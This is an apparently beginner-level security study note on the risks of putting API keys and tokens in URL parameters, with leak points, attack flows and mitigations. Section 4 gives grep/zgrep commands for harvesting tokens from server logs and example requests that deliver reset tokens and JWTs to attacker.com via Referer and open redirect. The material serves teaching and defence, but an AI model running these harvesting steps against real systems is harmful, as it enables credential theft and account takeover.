---
tags: [API_Security, Cryptography, Information_Disclosure, Vulnerability]
difficulty: beginner
module: "31 - API Security"
topic: "31.12 API Key in URL Parameters"
---

# 12 - API Key in URL Parameters

## 1. Executive Summary

Passing sensitive data—such as API keys, session tokens, passwords, or authentication credentials—in URL query parameters is a critical security anti-pattern. Despite the widespread availability of secure alternatives like HTTP headers (e.g., the `Authorization` header) and encrypted request bodies, many legacy applications, unauthenticated webhook endpoints, and poorly designed REST APIs continue to rely on query strings for access control.

When a secret is placed in a URL (e.g., `https://api.target.com/v1/users?api_key=SUPER_SECRET_XYZ`), it is fundamentally exposed. While Transport Layer Security (TLS/HTTPS) encrypts the URL during transit across the network, the URL is processed, logged, cached, and transmitted in plaintext across numerous intermediary systems, both on the client and server side. This creates an unmanageable sprawl of credential leakage, making it trivial for attackers to harvest active tokens from logs, browser histories, or third-party referer headers, leading directly to account takeover and system compromise.

## 2. Anatomy of the Vulnerability

### 2.1 The Semantic Nature of HTTP GET
The HTTP protocol defines `GET` requests as idempotent actions used strictly for retrieving resources. Because a standard `GET` request does not semantically support a request body, developers often default to appending all necessary parameters—including authentication tokens—to the query string.

While this approach is frictionless to implement and easy to test via simple browser navigation or cURL commands, it violates core security principles regarding the handling of sensitive state data. 

### 2.2 Points of Credential Leakage
Unlike the HTTP body or custom headers, which are transient and explicitly ignored by standard logging mechanisms, the requested URL path and its query string are treated as public routing information. When a key is in the URL, it leaks across multiple layers:

1. **Web Server Access Logs:** Nginx, Apache, IIS, and application servers log the full request line by default. Every transaction writes the API key to persistent disk storage in plain text.
2. **Browser History & Cache:** Modern browsers store full URLs in local history, synchronized cloud histories, and local disk caches. Anyone with physical or logical access to the user's machine can extract active session tokens.
3. **HTTP Referer Headers:** If a user is on an authenticated page (e.g., `app.com/dash?token=123`) and clicks a link to an external site, the browser sends the full URL to the external site via the `Referer` header. The third party now possesses the token.
4. **Proxies and WAFs:** Corporate forward proxies, Reverse Proxies, Content Delivery Networks (CDNs), and Web Application Firewalls (WAFs) inspect and log URLs.
5. **Analytics and Tracking:** Client-side tracking scripts (Google Analytics, Mixpanel) routinely collect `window.location.href` and transmit the full URL to third-party marketing dashboards.
6. **Shoulder Surfing:** The key is plainly visible in the browser's address bar, making it vulnerable to casual observation or screen recording.

## 3. Attack Architecture & Flow

```text
      [User / Client]
             |
             | 1. GET /api/data?api_key=SECRET_123
             v
      [Load Balancer / CDN]  --- 2. Logs URL: /api/data?api_key=SECRET_123
             |
             | 3. Forwards Request
             v
        [Web Server]   --------- 4. Writes to /var/log/nginx/access.log:
             |                      "GET /api/data?api_key=SECRET_123 HTTP/1.1"
             | 5. Internal Routing
             v
   [Application Backend] ------- 6. Application Error Tracker (e.g., Sentry)
                                    Logs URL including API Key during exceptions
                                    
  =============================================================================
  
      [Attacker Exploitation]
             |
             | 7. Attacker gains low-privilege access, finds LFI, or 
             |    compromises a third-party analytics dashboard.
             v
      [Log Aggregator]
             |
             | 8. Attacker executes search: 
             |    grep -Eo 'api_key=[^& ]+' access.log
             v
      [Stolen Credentials] ----> 9. Direct, unauthorized API access
```

## 4. Deep Dive: Exploitation Methodologies

### 4.1 Log Poisoning and Extraction (LFI/RCE Chaining)
During an engagement, if an attacker discovers a Local File Inclusion (LFI) vulnerability or gains low-level shell access, their immediate priority is log analysis. Web server access logs are treasure troves of URL-based secrets.

An attacker can easily extract thousands of valid session tokens with basic shell commands:
```bash
# Extracting tokens from Nginx logs
grep -oE 'access_token=[A-Za-z0-9\-\.\_]+' /var/log/nginx/access.log | sort | uniq -c

# Extracting tokens from AWS CloudTrail logs (if exported)
zgrep -oE 'session_id=[A-Za-z0-9]+' cloudtrail_logs.json.gz
```
Because these tokens are often long-lived API keys or active session IDs, the attacker can immediately use them to impersonate users without needing to crack passwords or bypass multi-factor authentication (MFA).

### 4.2 Exploiting the Referer Header Leakage
Consider a SaaS application that generates temporary authentication links for password resets or direct logins:
`https://app.target.com/reset_password?token=a1b2c3d4e5f6`

If the password reset page contains an external link—perhaps to a support site, a social media icon, or a user-generated content link—clicking that link forces the browser to send an HTTP request to the external domain:

```http
GET / HTTP/1.1
Host: external-attacker-domain.com
Referer: https://app.target.com/reset_password?token=a1b2c3d4e5f6
User-Agent: Mozilla/5.0...
```
The attacker operating `external-attacker-domain.com` simply reviews their own access logs, harvests the password reset token, and immediately utilizes it to change the victim's password.

### 4.3 Open Redirect Chaining
URL-based keys are highly susceptible to Open Redirect vulnerabilities. If an application utilizes an authentication flow that redirects the user upon success, an attacker can manipulate the destination.

**Malicious Link:**
`https://api.target.com/login?redirect=https://attacker.com`

After the victim successfully authenticates, the server generates a session token and appends it to the redirect URI:
```http
HTTP/1.1 302 Found
Location: https://attacker.com/?token=super_secret_jwt
```
The victim's browser obediently follows the redirect, immediately delivering the valid JWT to the attacker's server.

### 4.4 Caching and CDN Misconfigurations
Content Delivery Networks (CDNs) cache responses based on the cache key, which is almost always the full URL. If an endpoint containing a sensitive URL parameter (e.g., `GET /profile?api_key=user_1_key`) returns sensitive personal data, the CDN might cache that response. Another user or attacker requesting that exact URL might be served the cached response, or the cached URL itself might be exposed in public cache manifests.

## 5. Case Studies and Real-World Impact

### 5.1 OAuth 2.0 Implicit Flow Deprecation
Historically, the OAuth 2.0 "Implicit Flow" was designed for Single Page Applications. It returned access tokens directly in the URL fragment (the portion after the `#` hash):
`https://client-app.com/callback#access_token=eyJhbG...`

While fragments are explicitly NOT sent to the server by the browser (preventing server-log leakage), they are still stored in browser history, exposed to third-party JavaScript running on the page (via XSS), and vulnerable to open redirects. Because of these inherent URL-based risks, the IETF has officially deprecated the Implicit Flow in favor of the **Authorization Code Flow with Proof Key for Code Exchange (PKCE)**, which heavily mitigates these risks by relying on backend POST requests to exchange codes for tokens.

### 5.2 GitHub Webhooks and URL Secrets
Developers frequently configure webhooks (e.g., triggering a CI/CD pipeline when a commit is pushed). A common mistake is hardcoding the authentication token in the webhook URL:
`https://jenkins.internal.network/build?job=deploy&token=XYZ789`

GitHub must store this URL and transmit it. If the target server (Jenkins) or the source (GitHub repository settings) is compromised, the token is exposed in plain text. Modern best practices dictate that webhooks should utilize HMAC signatures in the HTTP headers (e.g., `X-Hub-Signature-256`), allowing the receiving server to validate the payload mathematically without transmitting the secret in the URL.

## 6. Mitigation & Defensive Strategies

### 6.1 Transition to HTTP Authorization Headers
The definitive solution is to refactor the application to transmit secrets exclusively via HTTP headers. The `Authorization` header is the industry standard for this purpose.

**Vulnerable Request:**
```http
GET /api/v2/financial_records?apikey=secret_xyz HTTP/1.1
Host: api.bank.com
```

**Secure Request:**
```http
GET /api/v2/financial_records HTTP/1.1
Host: api.bank.com
Authorization: Bearer secret_xyz
```
Headers are fully encrypted by TLS in transit and are rigorously ignored by standard logging configurations across web servers, load balancers, and CDNs.

### 6.2 Use POST/PUT for Sensitive Operations
If the API requires passing sensitive data that goes beyond a simple authentication token (e.g., Social Security Numbers, API keys for configuration, passwords), the HTTP method MUST be changed to `POST`, `PUT`, or `PATCH`. 

The sensitive data must be placed within the JSON/XML request body, ensuring it is entirely shielded from URL logging and caching mechanisms.

### 6.3 Implement Strict Referrer Policies
If legacy systems cannot be immediately refactored and URL tokens must persist temporarily, developers must mitigate Referer header leakage. Implement the `Referrer-Policy` HTTP response header to prevent the browser from transmitting the URL to external domains.

```http
Referrer-Policy: strict-origin-when-cross-origin
```
Alternatively, for maximum security on highly sensitive endpoints:
```http
Referrer-Policy: no-referrer
```

### 6.4 Log Masking and Sanitization
At the infrastructure level, configure WAFs, load balancers, and web servers to actively scrub or mask known sensitive parameters before writing to log files.

**Example Nginx Log Sanitization:**
Using map or custom Lua scripts, Nginx can dynamically replace the value of `api_key` with asterisks `***` before writing to `access.log`, ensuring that even if the URL contains a secret, it is never persisted to disk.

## 7. Chaining Opportunities
- **[[08 - Server-Side Request Forgery (SSRF)]]**: If an internal API requires a key in the URL, an attacker who finds an SSRF vulnerability can read internal logs or routing tables to find these URLs and subsequently forge requests to the internal API.
- **[[06 - Cross-Site Scripting (XSS)]]**: XSS payloads routinely read `window.location.href` to extract tokens embedded in URLs.
- **[[02 - Broken User Authentication]]**: Leaked session tokens directly facilitate complete account takeover without the need for credential brute-forcing.

## 8. Related Notes
- [[11 - API Key Exposure in Source Code JS Files]]
- [[Authentication Mechanisms & Best Practices]]
- [[Logging and Monitoring Anti-patterns]]
- [[OAuth 2.0 Security Flows]]
